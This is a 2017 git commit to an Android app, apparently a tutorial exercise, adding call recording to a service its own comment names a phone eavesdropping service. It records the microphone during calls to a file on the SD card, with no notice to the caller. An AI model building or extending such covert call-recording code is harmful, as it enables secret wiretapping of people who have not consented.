4da1854f2201c8373b50fd43d8bd650d4dc47d60
anwangwang <awwhome@163.com>
2017-03-05 16:17:34 +0800

    1.录音功能的实现

--- app/src/main/java/com/awwhome/phonelistener/service/PhoneListenerService.java
+++ app/src/main/java/com/awwhome/phonelistener/service/PhoneListenerService.java
@@ -2,11 +2,14 @@ package com.awwhome.phonelistener.service;
 
 import android.app.Service;
 import android.content.Intent;
+import android.media.MediaRecorder;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import java.io.IOException;
 
 /**
  * 电话窃听服务
@@ -15,6 +18,7 @@ import android.util.Log;
 public class PhoneListenerService extends Service {
 
     private static final String TAG = "PhoneListenerService";
+    private MediaRecorder mediaRecorder;
 
     @Nullable
     @Override
@@ -49,14 +53,39 @@ public class PhoneListenerService extends Service {
             // 电话状态
             switch (state) {
                 case TelephonyManager.CALL_STATE_IDLE: // 空闲状态
+                    // 停止录
+                    mediaRecorder.stop();
+                    // 重置mediaRecorder实例
+                    mediaRecorder.reset();   // You can reuse the object by going back to setAudioSource() step
+                    mediaRecorder.release(); // Now the object cannot be reused
                     break;
                 case TelephonyManager.CALL_STATE_RINGING: // 响铃状态
 
                     Log.d(TAG, "onCallStateChanged: 准备录音机");
+
+                    // 获取MediaRecorder实例
+                    mediaRecorder = new MediaRecorder();
+                    // 设置音频来源
+                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); // MIC单方的；VOICE_CALL双方的；
+                    // 设置输出格式
+                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                    // 设置音频编码
+                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                    // 存储位置
+                    mediaRecorder.setOutputFile("/mnt/sdcard/luyin.3gp");
+                    try {
+                        // 准备录
+                        mediaRecorder.prepare();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
                     break;
                 case TelephonyManager.CALL_STATE_OFFHOOK: // 接听状态
 
                     Log.d(TAG, "onCallStateChanged: 开始录音。。。");
+
+                    mediaRecorder.start();   // Recording is now started
                     break;
 
             }
